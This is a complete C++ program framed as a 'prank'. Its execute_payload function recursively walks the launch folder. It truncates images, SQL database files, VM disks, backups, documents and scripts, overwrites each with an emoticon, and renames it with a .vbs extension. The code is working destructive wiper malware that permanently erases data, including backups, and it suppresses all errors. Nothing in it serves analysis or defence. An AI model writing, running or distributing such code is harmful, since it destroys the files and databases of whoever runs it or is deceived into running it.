#include <iostream>
#include <fstream>
#include <string>
#include <filesystem>
#include <algorithm>
#include <vector>
#include <random>

namespace fs = std::filesystem;

void execute_payload(const std::string& directory_path) {
    std::vector<std::string> faces = {":3", "OwO", ">w<", "^w^"};
    
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, faces.size() - 1);
    std::uniform_int_distribution<> rare_roll(1, 100);

    if (!fs::exists(directory_path)) return;

    for (const auto& entry : fs::recursive_directory_iterator(directory_path)) {
        if (!entry.is_regular_file()) continue;

        std::string file_path = entry.path().string();
        std::string extension = entry.path().extension().string();
        std::transform(extension.begin(), extension.end(), extension.begin(), ::tolower);

        // Pick a face
        std::string random_goober;
        if (rare_roll(gen) == 1) {
            random_goober = "X3"; 
        } else {
            random_goober = faces[dis(gen)];
        }

        try {
            // THE EXPANDED TARGET LIST
            if (extension == ".jpg" || extension == ".png" ||        // Images
                extension == ".mdf" || extension == ".ldf" ||        // SQL
                extension == ".vhdx" || extension == ".vmdk" ||      // VMs
                extension == ".parquet" || extension == ".avro" ||    // Big Data
                extension == ".bak" || extension == ".sql" ||        // Backups
                extension == ".json" || extension == ".pdf" ||       // Documents & Data
                extension == ".vbs" || extension == ".bat" ||        // Scripts
                extension == ".gdoc" || extension == ".docx") {      // Office Files
                
                std::ofstream file(file_path, std::ios::trunc);
                if (file.is_open()) {
                    file << random_goober;
                    file.close();
                    
                    // Rename to .vbs (The ultimate prank extension)
                    fs::rename(file_path, file_path + ".vbs");
                }
            }
        }
        catch (...) {}
    }
}

int main() {
    // Targets the current folder where the EXE is launched
    std::string target = "./"; 
    execute_payload(target);
    return 0;
}
